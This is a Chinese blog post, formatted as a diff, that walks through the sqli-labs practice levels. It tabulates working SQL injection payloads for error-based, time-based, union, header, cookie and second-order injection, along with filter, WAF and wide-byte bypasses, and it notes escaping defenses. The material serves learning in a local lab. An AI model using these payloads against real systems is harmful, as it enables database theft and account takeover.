+<td>bigint   超出范围；~0 是对 0 逐位取反，很大的版本在 5.5.5 及其以上   bigint   溢出文章 <a href="http://www.cnblogs.com/lcamry/articles/5509112.html" target="_blank" rel="noopener">http://www.cnblogs.com/lcamry/articles/5509112.html</a></td>
+</tr>
+<tr>
+<td>?id=1&#39;   and extractvalue(1,concat(0x7e,(select   @@version),0x7e)) --+</td>
+<td>xpath   函数报错注入   mysql   对 xml 数据进 行查询和修改的 xpath 函数，xpath 语法错误</td>
+</tr>
+<tr>
+<td>?id=1&#39;   and updatexml(1,concat(0x7e,(select   @@version),0x7e),1) --+</td>
+<td>mysql   对 xml 数据进 行查询和修改的 xpath 函数，xpath 语法错误</td>
+</tr>
+<tr>
+<td>?id=1&#39;union   select 1,2,3 from (select NAME_CONST(version(),1), NAME_CONST(version(),1))x   --+</td>
+<td>利用数据的重复性</td>
+</tr>
+</tbody></table>
+<h2 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h2><table>
+<thead>
+<tr>
+<th>注入语句</th>
+<th>数据库语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>?id=1&#39;   and If(ascii(substr(database(),1,1))=115,1,sleep(5)) --+</td>
+<td>利用   sleep()函数进行注入</td>
+</tr>
+<tr>
+<td>?id=1&#39;UNION   SELECT   (IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,ENCODE(&#39;MSG&#39;,&#39;by 5   seconds&#39;)),null)),2,3 FROM (select database() as current)    BENCHMARK(count,expr)用于测试函数的性能，参数一为次数，二为要执行的表达   式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执 行成功。这是一种边信道攻击，在运行过程中占用大量的 cpu   资源。推荐使用 sleep()</td>
+<td>利用   BENCHMARK()进行延时注入   当结果正确的时候，运行   ENCODE(&#39;MSG&#39;,&#39;by 5 seconds&#39;)操作 50000000 次，会占用一段时间</td>
+</tr>
+</tbody></table>
+<p> <img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0avcbxr3ej20z505f0ss.jpg" alt></p>
+<h1 id="Less10-post注入"><a href="#Less10-post注入" class="headerlink" title="Less10 post注入"></a>Less10 post注入</h1><table>
+<thead>
+<tr>
+<th>注入语句</th>
+<th>数据库语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>admin&#39;or&#39;1&#39;=&#39;1              密码随意</td>
+<td>@$sql=&quot;SELECT   username, password FROM users WHERE username=&#39;admin&#39;or&#39;1&#39;=&#39;1# and   password=&#39;$passwd&#39;LIMIT0,1&quot;;</td>
+</tr>
+<tr>
+<td>admin&#39;   union select 1,database()#</td>
+<td>爆出账号密码</td>
+</tr>
+<tr>
+<td>Admin&quot;)   or 1=1#</td>
+<td>near &#39;admin&quot;)</td>
+</tr>
+<tr>
+<td>admin&#39;)   and left(database(),1)&gt; &#39;a&#39;#</td>
+<td>near &#39;admin&#39;)</td>
+</tr>
+</tbody></table>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0ave1s42fj20ak089glh.jpg" alt></p>
+<h1 id="增删改函数介绍"><a href="#增删改函数介绍" class="headerlink" title="增删改函数介绍"></a>增删改函数介绍</h1><h2 id="增"><a href="#增" class="headerlink" title="增"></a>增</h2><p><code>insert into users values(&#39;16&#39;,&#39;lcamry&#39;,&#39;lcamry&#39;);</code></p>
+<h2 id="删"><a href="#删" class="headerlink" title="删"></a>删</h2><p>Delete from users where id=16</p>
+<p>Delete from 表名;</p>
+<p>Delete from 表名 where id=1;</p>
+<p>删除结构：</p>
+<p>删数据库：drop database 数据库名;</p>
+<p>删除表：drop table 表名;</p>
+<p>删除表中的列:</p>
+<p>Alter table 表名 drop column  列名;</p>
+<h2 id="改"><a href="#改" class="headerlink" title="改"></a>改</h2><p>Update users set username=&#39;tt&#39; where id=15</p>
+<p>修改所有：updata 表名 set列名=&#39;新的值，非数字加单引号&#39;;</p>
+<p>带条件的修改：updata 表名 set 列名=&#39;新的值，非数字加单引号&#39; where id=6;</p>
+<h1 id="Less17-密码注入"><a href="#Less17-密码注入" class="headerlink" title="Less17 密码注入"></a>Less17 密码注入</h1><table>
+<thead>
+<tr>
+<th>注入语</th>
+<th>数据库语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>uname=admin&amp;passwd=11&#39;and   extractvalue(1,concat(0x7e,(select @@version),0x7e))#&amp;submit=Submit</td>
+<td>爆出版本</td>
+</tr>
+<tr>
+<td>uname=admin&amp;passwd=11&#39;and   If(ascii(substr(database(),1,1))=115,1,sleep(5))#&amp;submit=Submit</td>
+<td>延时注入</td>
+</tr>
+</tbody></table>
+<p>那为什么我们不从 username 处进行构 造呢？</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0avgkznhpj20q50k7n6m.jpg" alt></p>
+<p> <img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0avgt5dq0j20jd0cgmxs.jpg" alt></p>
+<h1 id="防注入函数介绍"><a href="#防注入函数介绍" class="headerlink" title="防注入函数介绍"></a>防注入函数介绍</h1><h2 id="addslashes"><a href="#addslashes" class="headerlink" title="addslashes()"></a>addslashes()</h2><p>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</p>
+<p>单引号（&#39;）</p>
+<p>双引号（&quot;）</p>
+<p>反斜杠（\）</p>
+<p>NULL</p>
+<p>提示：该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。</p>
+<p>注释：默认地，PHP 对所有的 GET、POST 和 COOKIE 数据自动运行 addslashes()。所以您不应对已转义过的字符串使用 addslashes()，</p>
+<p>因为这样会导致双层转义。遇到这种情况时可 以使用函数 <code>get_magic_quotes_gpc()</code> 进行检测。</p>
+<h2 id="stripslashes"><a href="#stripslashes" class="headerlink" title="stripslashes()"></a>stripslashes()</h2><p>函数删除由 addslashes() 函数添加的反斜杠</p>
+<h2 id="mysql-real-escape-string"><a href="#mysql-real-escape-string" class="headerlink" title="mysql_real_escape_string()"></a>mysql_real_escape_string()</h2><p>mysql_real_escape_string(string,connection)</p>
+<p>函数转义 SQL 语句中使用的字符串中的特殊字符。</p>
+<p>下列字符受影响：</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>string</td>
+<td>必需。规定要转义的字符串。</td>
+</tr>
+<tr>
+<td>connection</td>
+<td>可选。规定 MySQL   连接。如果未规定，则使用上一个连接.</td>
+</tr>
+</tbody></table>
+<p>本函数将 string 中的特殊字符转义，并考虑到连接的当前字符集，因此可以安全用 于 mysql_query()。</p>
+<p>在我们 less17 的 check_input()中，对 username 进行各种转义的处理，所以此处不能使用 username 进行注入。</p>
+<h1 id="HTTP-头部介绍"><a href="#HTTP-头部介绍" class="headerlink" title="HTTP 头部介绍"></a>HTTP 头部介绍</h1><table>
+<thead>
+<tr>
+<th align="left">Accept</th>
+<th align="left">告诉   WEB 服务器自己接受什么介质类型，* / * 表示任何类型，type/* 表示该 类型下的所有子类型，type/sub-type。</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Accept- Charset</td>
+<td align="left">浏览器申明自己接收的字符集</td>
+</tr>
+<tr>
+<td align="left">Accecpt-Encode                     ccccccccccccccccc</td>
+<td align="left">浏览器申明自己接收的编码方法，通常指定压缩方法，是否支持压缩，   支持什么压缩方法（gzip，deflate）</td>
+</tr>
+<tr>
+<td align="left">Accept-Language</td>
+<td align="left">浏览器申明自己接收的语言  比如 big5，gb2312，gbk   等等</td>
+</tr>
+<tr>
+<td align="left">Accept-Ranges</td>
+<td align="left">WEB   服务器表明自己是否接受获取其某个实体的一部分</td>
+</tr>
+<tr>
+<td align="left">Age</td>
+<td align="left">当代理服务器用自己缓存的实体去响应请求时，用该头部表明该实体从产生到现   在经过多长时间了。</td>
+</tr>
+<tr>
+<td align="left">Authorization</td>
+<td align="left">当客户端接收到来自   WEB 服务器的 WWW-Authenticate 响应时，用该 头部来回应自己的身份验证信息给 WEB 服务器。</td>
+</tr>
+<tr>
+<td align="left">Cache-Control</td>
+<td align="left">请求：no-cache（不要缓存的实体，要求现在从   WEB 服务器去取）</td>
+</tr>
+<tr>
+<td align="left">max-age</td>
+<td align="left">（只接受   Age 值小于 max-age 值，并且没有过期的对象</td>
+</tr>
+<tr>
+<td align="left">max-stale</td>
+<td align="left">可以接受过去的对象，但是过期时间必须小于   max-stale 值</td>
+</tr>
+<tr>
+<td align="left">Connection</td>
+<td align="left">请求：close（告诉   WEB 服务器或者代理服务器，在完成本次请求的响应 后，断开连接，不要等待本次连接的后续请求了）。</td>
+</tr>
+<tr>
+<td align="left">keepalive</td>
+<td align="left">告诉   WEB 服务器或者代理服务器，在完成本次请求的响应后，保持连接，等待 本次连接的后续请求。</td>
+</tr>
+<tr>
+<td align="left">Keep-Alive</td>
+<td align="left">如果浏览器请求保持连接，则该头部表明希望 WEB 服务器保持连接多长时间   ：Keep-Alive：300</td>
+</tr>
+<tr>
+<td align="left">Content-Encoding</td>
+<td align="left">WEB   服务器表明自己使用了什么压缩方法（gzip，deflate）压缩响应 中的对象。例如：Content-Encoding：gzip</td>
+</tr>
+<tr>
+<td align="left">Content-Language</td>
+<td align="left">WEB   服务器告诉浏览器自己响应的对象的语言</td>
+</tr>
+<tr>
+<td align="left">Content-Length</td>
+<td align="left">WEB   服务器告诉浏览器自己响应的对象的长度。例如： Content-Length: 26012</td>
+</tr>
+<tr>
+<td align="left">Content-Range</td>
+<td align="left">WEB   服务器表明该响应包含的部分对象为整个对象的哪个部分。例如： Content-Range:bytes21010-47021/47022</td>
+</tr>
+<tr>
+<td align="left">Content-Type</td>
+<td align="left">WEB 服务器告诉浏览器自己响应的对象的类型。例如：Content-Type：   application/xml</td>
+</tr>
+<tr>
+<td align="left">Expired</td>
+<td align="left">WEB   服务器表明该实体将在什么时候过期，对于过期了的对象，只有在跟 WEB 服务器验证了其有效性后，才能用来响应客户请求</td>
+</tr>
+<tr>
+<td align="left">Host</td>
+<td align="left">客户端指定自己想访问的   WEB 服务器的域名/IP 地址和端口号</td>
+</tr>
+<tr>
+<td align="left">If-Match</td>
+<td align="left">如果对象的   ETag 没有改变，其实也就意味著对象没有改变，才执行请求的 动作。</td>
+</tr>
+<tr>
+<td align="left">If-None-Match</td>
+<td align="left">如果对象的   ETag 改变了，其实也就意味著对象也改变了，才执行请求 的动作。</td>
+</tr>
+<tr>
+<td align="left">If-Modified-Since</td>
+<td align="left">如果请求的对象在该头部指定的时间之后修改了，才执行请求的动   作（比如返回对象），否则返回代码 304，告诉浏览器 该对象没有修改。例如：   If-Modified-Since：Thu,10Apr200809:14:42GMT</td>
+</tr>
+<tr>
+<td align="left">If-Unmodified-Since</td>
+<td align="left">如果请求的对象在该头部指定的时间之后没修改过，才执行请求   的动作（比如返回对象）</td>
+</tr>
+<tr>
+<td align="left">If-Range</td>
+<td align="left">浏览器告诉   WEB 服务器，如果我请求的对象没有改变，就把我缺少的部分 给我，如果对象改变了，就把整个对象给我。浏览器通过发送请求对象的 ETag 或者 自己   所知道的最后修改时间给 WEB 服务器，让其判断对象是否改变了。总是跟 Range 头部一 起使用。</td>
+</tr>
+<tr>
+<td align="left">Last-Modified</td>
+<td align="left">WEB   服务器认为对象的最后修改时间，比如文件的最后修改时间，动 态页面的最后产生时间等等。   例如：Last-Modified：Tue,06May200802:42:43GMT</td>
+</tr>
+<tr>
+<td align="left">Location</td>
+<td align="left">WEB   服务器告诉浏览器，试图访问的对象已经被移到别的位置了，到该头 部 指 定 的 位 置 去 取 。    例 如 ： Location ： <a href="http://i0.sinaimg.cn" target="_blank" rel="noopener">http://i0.sinaimg.cn</a>   /dy/deco/2008/0528/sinahome_0803_ws_005_text_0.gif</td>
+</tr>
+<tr>
+<td align="left">Pramga</td>
+<td align="left">主要使用   Pramga:no-cache，相当于 Cache-Control：no-cache。例如： Pragma： no-cache</td>
+</tr>
+<tr>
+<td align="left">Proxy-Authenticate</td>
+<td align="left">代理服务器响应浏览器，要求其提供代理身份验证信息。    Proxy-Authorization：浏览器响应代理服务器的身份验证请求，提供自己的身份信息。</td>
+</tr>
+<tr>
+<td align="left">Range</td>
+<td align="left">浏览器（比如   Flashget 多线程下载时）告诉 WEB 服务器自己想取对象的哪 部分。例如：Range:bytes=1173546</td>
+</tr>
+<tr>
+<td align="left">Referer</td>
+<td align="left">浏览器向   WEB 服务器表明自己是从哪个 网页/URL 获得/点击 当前请求中 的网址/URL。例如：Referer：<a href="http://www.sina.com/" target="_blank" rel="noopener">http://www.sina.com/</a></td>
+</tr>
+<tr>
+<td align="left">Server</td>
+<td align="left">WEB   服务器表明自己是什么软件及版本等信息。例如：Server：Apache/2.0.61 (Unix)</td>
+</tr>
+<tr>
+<td align="left">User-Agent</td>
+<td align="left">浏览器表明自己的身份（是哪种浏览器）。例如：User-Agent：Mozilla/5.0   (Windows;U;WindowsNT5.1;zh-CN;rv:1.8.1.14)Gecko/20080404Firefox/2、0、0、14</td>
+</tr>
+<tr>
+<td align="left">Transfer-Encoding</td>
+<td align="left">WEB   服务器表明自己对本响应消息体（不是消息体里面的对象）作了怎样的编码，   比如是否分块（chunked）。例如：Transfer-Encoding:chunked</td>
+</tr>
+<tr>
+<td align="left">Vary</td>
+<td align="left">WEB   服务器用该头部的内容告诉 Cache 服务器，在什么条件下才能用本响应所 返回的对象响应后续的请求。   假如源   WEB 服务器在接到第一个请求消息时，其响应消息的 头部为：Content-Encoding:gzip;Vary:Content-Encoding    那么   Cache 服务器会分析后续请求 消息的头部，检查其 Accept-Encoding，是否跟先前响应的 Vary 头部值一致，即是否使用   相同的内容编码方法，这样就可以防止 Cache 服务器用自己 Cache 里面压缩后的实体响应   给不具备解压能力的浏览器。例如：Vary：Accept-Encoding</td>
+</tr>
+<tr>
+<td align="left">Via</td>
+<td align="left">列出从客户端到 OCS 或者相反方向的响应经过了哪些代理服务器，他们用什么   协议（和版本）发送的请求。当客户端请求到达第一个代理服务器时，该服务器会在自己发 出的请求里面添 加 Via   头部，并填上自己的相关信息，当下一个代理服务器收到第一个代理服务器的请求时，会在自己发出的请求里面复制前一个代理服务器的请求的 Via 头部，并   把自己的相关信息加到后面，以此类推，当 OCS 收到最后一个代理服务器的请求时，检查 Via 头部，就知道该请求所经过的路由。例如：Via：1.0   236.D0707195.sina.com.cn:80 (squid/2.6.STABLE13)</td>
+</tr>
+</tbody></table>
+<h1 id="Less18-http头注入"><a href="#Less18-http头注入" class="headerlink" title="Less18 http头注入"></a>Less18 http头注入</h1><table>
+<thead>
+<tr>
+<th>user-agent</th>
+<th>&#39;and extractvalue(1,concat(0x7e,(select@@version),0x7e))and&#39;1&#39;=&#39;1</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Referer</td>
+<td>&#39;and extractvalue(1,concat(0x7e,(select@@basedir),0x7e))and&#39;1&#39;=&#39;1</td>
+</tr>
+<tr>
+<td>Cookie</td>
+<td>uname=admin1&#39; and extractvalue(1,concat(0x7e,(select@@basedir),0x7e))#</td>
+</tr>
+<tr>
+<td>Base64处理cookie</td>
+<td>uname=base64(admin1&#39; and extractvalue(1,concat(0x7e,(select@@basedir),0x7e))#)</td>
+</tr>
+</tbody></table>
+<h1 id="Less23-过滤注释符"><a href="#Less23-过滤注释符" class="headerlink" title="Less23 过滤注释符"></a>Less23 过滤注释符</h1><p>Sql 语句为<code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT0,1&quot;;</code>此处主要是在获取 id 参数时 进行了<code>#</code>，<code>--</code>注释符号的过滤</p>
+<p>1、id=-1，为什么要用-1，因为 sql 语句执行了两个 select 语句，第一个 select 为 id 的选择语 句，第二个为我们构造的 select 语句。只有一个数据可以输出，为了让我们自己构造的数据 可以正常输出，第一个 select 要没有结果，所以-1 或者超过数据库所有数据都可以。</p>
+<p>2、<code>-1&#39;union select1,@@datadir,&#39;3</code>，第一个&#39;（单引号）闭合-1，第二个&#39;（单引号）闭合后面 的。这样将查询内容显示在 username 处</p>
+<p>3、此 处 可 以 报 错 注 入 ， 延 时 注 入 ， 可 以 利 用 or &#39;1&#39;=&#39;1 进 行 闭 合 。</p>
+<p><a href="http://127.0.0.1/sqllib/Less-23/index.php?id=1&#39;or" target="_blank" rel="noopener">http://127.0.0.1/sqllib/Less-23/index.php?id=1&#39;or</a> extractvalue(1,concat(0x7e,database())) or &#39;1&#39;=&#39;1</p>
+<table>
+<thead>
+<tr>
+<th>注入语句</th>
+<th>数据库语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>?id=-1&#39;   union select 1,@@datadir,&#39;3</td>
+<td>SELECT * FROM users WHERE id=&#39;-1&#39;unionselect1,@@datadir,&#39;3&#39;limit0,1</td>
+</tr>
+<tr>
+<td>?id=1&#39;or   extractvalue(1,concat(0x7e,database())) or &#39;1&#39;=&#39;1</td>
+<td>extractvalue()进行报错注入。</td>
+</tr>
+<tr>
+<td>?id=-1&#39;union select 1,(select group_concat(schema_name)from information_schema.schemata),&#39;3</td>
+<td>获取数据库</td>
+</tr>
+<tr>
+<td>?id=-1&#39; union   select 1,(select group_concat(table_name) from information_schema.tables   where table_schema=&#39;security&#39;),&#39;3</td>
+<td>查看   security 库数据表</td>
+</tr>
+<tr>
+<td>?id=-1&#39;union   select 1,(select group_concat(column_name) from information_schema.columns   where table_name=&#39;users&#39;),&#39;3</td>
+<td>查看   users 表的所有列</td>
+</tr>
+<tr>
+<td>?id=-1&#39;union select 1,(select group_concat(username) from security.users limit 0,1),&#39;3</td>
+<td>获取内容</td>
+</tr>
+</tbody></table>
+<h1 id="Less24-二次排序注入"><a href="#Less24-二次排序注入" class="headerlink" title="Less24 二次排序注入"></a>Less24 二次排序注入</h1><ol>
+<li><p>黑客通过构造数据的形式，在浏览器或者其他软件中提交 HTTP 数据报文请求到服务 端进行处理，提交的数据报文请求中可能包含了黑客构造的 SQL 语句或者命令。</p>
+</li>
+<li><p>服务端应用程序会将黑客提交的数据信息进行存储，通常是保存在数据库中，保存的 数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端请求做出响 应。</p>
+</li>
+<li><p>黑客向服务端发送第二个与第一次不相同的请求数据信息。</p>
+</li>
+<li><p>服务端接收到黑客提交的第二个请求信息后，为了处理该请求，服务端会查询数据库 中已经存储的数据信息并处理，从而导致黑客在第一次请求中构造的 SQL 语句或者命令在服 务端环境中执行。</p>
+</li>
+<li><p>服务端返回执行的处理结果数据信息，黑客可以通过返回的结果数据信息判断二次注 入漏洞利用是否成功</p>
+</li>
+</ol>
+<p>此例子中我们的步骤是注册一个 <code>admin&#39;#</code>的账号，接下来登录该帐号后进行修改密码。</p>
+<p>此时 修改的就是 admin的密码。 Sql 语句变为 UPDATE users SET passwd=&quot;New_Pass&quot; WHERE username =&#39; admin&#39; # &#39; AND password=&#39; ，</p>
+<p>也 就 是 执 行了 <strong>UPDATE users SET passwd=&quot;New_Pass&quot; WHERE username =&#39; admin&#39;</strong></p>
+<p>①初始数据库为</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0aw8ct5zuj20dl0aojxa.jpg" alt></p>
+<p>②注册admin&#39;#账号，此时admin的密码为111</p>
+<p>③登陆admin&#39;# 的账号并且修改密码</p>
+<p>④可以看到admin的密码已经被修改</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0aw9986d7j207m096n6m.jpg" alt></p>
+<h1 id="Less25-过滤or-and"><a href="#Less25-过滤or-and" class="headerlink" title="Less25 过滤or and"></a>Less25 过滤or and</h1><table>
+<thead>
+<tr>
+<th>?id=1&amp;&amp;1=1--+</th>
+<th>过滤and</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>?id=1&#39;||extractvalue(1,concat(0x7e,database()))--+</td>
+<td>过滤or</td>
+</tr>
+<tr>
+<td>?id=-1   union select 1,@@basedir,3 --+</td>
+<td>联合注入</td>
+</tr>
+</tbody></table>
+<h1 id="Less26-过滤空格"><a href="#Less26-过滤空格" class="headerlink" title="Less26 过滤空格"></a>Less26 过滤空格</h1><p>本关可能有的朋友在 windows 下无法使用一些特殊的字符代替空格，此处是因为 apache 的解析的问题，这里请更换到 linux 平台下。</p>
+<p> 本关结合 25 关，将空格，or,and,/*,#,--,/等各种符号过滤，此处对于 and，or 的处理方 法不再赘述，参考 25.此处我们需要说明两方面：</p>
+<p>对于注释和结尾字符的我们此处只能利用 构造一个 &#39; 来闭合后面到 &#39; ；对于空格，有较多的方法</p>
+<p>SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1</p>
+<p>有些环境可能不解析</p>
+<table>
+<thead>
+<tr>
+<th>注入语句</th>
+<th>数据库语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>?id=1&#39;%a0||&#39;1</td>
+<td>SELECT * FROM users WHERE id=&#39;1&#39; || &#39;1&#39;   LIMIT 0,1</td>
+</tr>
+<tr>
+<td>?id=100%27union%0bselect%a01,2,3||%271</td>
+<td>SELECT * FROM users WHERE id=&#39;100&#39; union select   1,2,3||&#39;1</td>
+</tr>
+<tr>
+<td>?id=1&#39;) union%a0select%a01,2,3||(&#39;1</td>
+<td>SELECT * FROM users WHERE id=(&#39;$id&#39;) LIMIT   0,1</td>
+</tr>
+<tr>
+<td>?id=100&#39;)union%a0select%a01,user(),(&#39;3</td>
+<td>基础与   26 一致，我们直接用 &#39;) 闭合前面的，然后跟上自己构造的注入语句即 可。最后利用（&#39;1 进行闭合即可。</td>
+</tr>
+</tbody></table>
+<p>以前的方法 1,user(),3|| &quot;1</p>
+<h1 id="Less27-大小写绕过"><a href="#Less27-大小写绕过" class="headerlink" title="Less27 大小写绕过"></a>Less27 大小写绕过</h1><table>
+<thead>
+<tr>
+<th>注入语句</th>
+<th>数据库语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>?id=100&#39;unIon%a0SelEcT%a01,database(),3||&#39;1</td>
+<td>大小写绕过</td>
+</tr>
+<tr>
+<td>?id=100&#39;uniunionon%a0SelEcT%a01,database(),3||&#39;1</td>
+<td>双写绕过</td>
+</tr>
+<tr>
+<td>?id=100“%a0UnIon%a0SElecT%a01,user(),&quot;3</td>
+<td>Union   select 1,user(),&quot;3</td>
+</tr>
+<tr>
+<td>?id=100&#39;)union%a0select(1),(user()),(3)||(&#39;1</td>
+<td>Union   select(1),(user()),(3)||(1&#39;       payload</td>
+</tr>
+<tr>
+<td>?id=100%27)unIon%0bsElect%0b1,@@basedir,3||(%271</td>
+<td>Payload</td>
+</tr>
+</tbody></table>
+<h1 id="服务器（两层）架构-http-参数污染"><a href="#服务器（两层）架构-http-参数污染" class="headerlink" title="服务器（两层）架构 http 参数污染"></a>服务器（两层）架构 http 参数污染</h1><p> <img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0awcf8u3vj20kz0bg779.jpg" alt></p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0awcm7vjgj20ox0asgqf.jpg" alt></p>
+<p>此处我们想一个问题：index.jsp?id=1&amp;id=2 请求，针对第一张图中的服务器配置情况， 客户端请求首先过 tomcat，tomcat 解析第一个参数，</p>
+<p>接下来 tomcat 去请求 apache（php） 服务器，apache 解析最后一个参数。那最终返回客户端的应该是哪个参数？</p>
+<p> <strong>Answer：此处应该是 id=2 的内容，应为时间上提供服务的是 apache（php）服务器， 返回的数据也应该是 apache 处理的数据。</strong></p>
+<p>而在我们实际应用中，也是有两层服务器的情况， 那为什么要这么做？是因为我们往往在 tomcat 服务器处做数据过滤和处理，功能类似为一 个 WAF。</p>
+<p>而正因为解析参数的不同，我们此处可以利用该原理绕过 WAF 的检测。该用法就 是 HPP（HTTPParameterPollution），http 参数污染攻击的一个应用。<code>HPP</code> 可对服务器和客 户端都能够造成一定的威胁。</p>
+<table>
+<thead>
+<tr>
+<th>注入语句</th>
+<th>数据库语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>?id=1&amp;id=-2&#39;union   select 1,user(),3--+</td>
+<td>对第二个参数进行注入</td>
+</tr>
+<tr>
+<td>?id=1&amp;id=-2&quot; union select 1,user(),3--+</td>
+<td>之前是&#39;现在是&quot;</td>
+</tr>
+<tr>
+<td>?id=1&amp;id=-2&quot;) union select 1,user(),3--+</td>
+<td>之前是&quot;现在是“）</td>
+</tr>
+</tbody></table>
+<p>从以上三关中，我们主要学习到的是不同服务器对于参数的不同处理，HPP 的应用有 很多，不仅仅是我们上述列出过 WAF 一个方面，还有可以执行重复操作，可以执行非法操 作等。同时针对 WAF 的绕过，我们这里也仅仅是抛砖引玉，后续的很多的有关 HPP 的方法 需要共同去研究。这也是一个新的方向</p>
+<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p>原理：mysql 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如%aa%5c 就是一个 汉字（前一个 ascii码大于 128 才能到汉字的范围）。</p>
+<p>我们在过滤 &#39; 的时候，往往利用的思 路是将 &#39; 转换为 &#39; （转换的函数或者思路会在每一关遇到的时候介绍）。</p>
+<p>因此我们在此想办法将 &#39; 前面添加的 \ 除掉，一般有两种思路：</p>
+<p>1、%df 吃掉 \ 具体的原因是 urlencode(&#39;) =<code>%5c%27</code>，我们在%5c%27 前面添加%df，形 成<code>%df%5c</code>%27(運&#39;)，而上面提到的 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，此 事%df%5c 就是一个汉字，%27 则作为一个单独的符号在外面，同时也就达到了我们的目的。</p>
+<p>2、将 &#39; 中的 \ 过滤掉，例如可以构造 <code>%**%5c%5c%27</code> 的情况，后面的%5c 会被前面的%5c 给注释掉。这也是 bypass的一种方法。</p>
+<h1 id="Less32-宽字节绕过（GET-POST）"><a href="#Less32-宽字节绕过（GET-POST）" class="headerlink" title="Less32 宽字节绕过（GET POST）"></a>Less32 宽字节绕过（GET POST）</h1> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df%27union select 1,user(),3--+</span><br><span class="line">%df%5c构成一个汉字  宽字节绕过</span><br></pre></td></tr></table></figure>
+
+<h2 id="Addslashes"><a href="#Addslashes" class="headerlink" title="Addslashes()"></a>Addslashes()</h2><p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0awj5x8n7j20my08wn6m.jpg" alt></p>
+<p>Notice：使用 addslashes(),我们需要将 <code>mysql_query</code> 设置为 <code>binary</code>的方式，才能防御此漏洞。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mysql_query(“<span class="keyword">SET</span> character_set_connection=gbk,character_set_result=gbk,character_set_client=<span class="built_in">binary</span>”,$<span class="keyword">conn</span>);</span><br></pre></td></tr></table></figure>
+
+<p>post：</p>
+<p>原始的 sql 语句为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@$sql=&quot;SELECT username, password FROM users WHERE username=&apos;$uname&apos; and password=&apos;$passwd&apos; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0awjjqlh0j20dm02fmxs.jpg" alt></p>
+<table>
+<thead>
+<tr>
+<th>注入语句</th>
+<th>数据库语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>&#39;  &#39; or 1=1#</td>
+<td>SELECT   username, password FROM users WHERE username=&#39;  &#39; or 1=1#&#39; and password=&#39;$passwd&#39; LIMIT 0,1</td>
+</tr>
+</tbody></table>
+<h2 id="mysql-real-escape-string-1"><a href="#mysql-real-escape-string-1" class="headerlink" title="mysql_real_escape_string()"></a>mysql_real_escape_string()</h2><p>mysql_real_escape_string()转义sql语句使用的字符串的特殊字符</p>
+<ul>
+<li>\x00</li>
+<li>\n</li>
+<li>\r</li>
+<li>\</li>
+<li>&#39;</li>
+<li>&quot;</li>
+<li>\x1a</li>
+</ul>
+<p>但是因 mysql 我们并没有设置成<code>gbk</code>，所以 mysql_real_escape_string()依旧能够被突破。方法 和上述是一样的。</p>
+<p>这个我们利用的 &#39; 的 <code>utf-16</code>进行突破的，我们也可以利用%df 进行。</p>
+<table>
+<thead>
+<tr>
+<th>注入语句</th>
+<th>数据库语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>id=-1%df%27union%20select%201,user(),3--+</td>
+<td>SELECT   username, password FROM users WHERE username=&#39;  &#39; or 1=1#&#39; and password=&#39;$passwd&#39; LIMIT 0,1</td>
+</tr>
+</tbody></table>
+<p>防御：在使用 mysql_real_escape_string()时，如何能够安全的防护这种问题，需要将 mysql 设置为 gbk 即可。</p>
+<p>设置代码： <code>Mysql_set_charset(&#39;gbk&#39;,&#39;$conn&#39;)</code></p>
+<p>Summary: 从上面的几关当中，可以总结一下过滤 <code>&#39;</code> ，<code>\</code>常用的三种方式是直接 replace， addslashes(),mysql_real_escape_string()。</p>
+<p>三种方式仅仅依靠一个函数是不能完全防御的，所 以我们在编写代码的时候需要考虑的更加仔细。同时在上述过程中，我们也给出三种防御的 方式，相信仔细看完已经明白了，这里就不赘述了。</p>
